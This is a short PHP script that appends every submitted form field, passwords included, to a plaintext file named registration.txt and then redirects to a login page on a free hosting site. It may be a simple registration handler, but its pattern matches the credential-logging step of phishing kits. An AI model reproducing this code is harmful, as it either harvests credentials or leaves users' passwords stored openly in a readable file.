<?php
header ('Location:https://mrkfus.000webhostapp.com/Webnet%20login%20n%20register/login.html');
$handle = fopen("registration.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 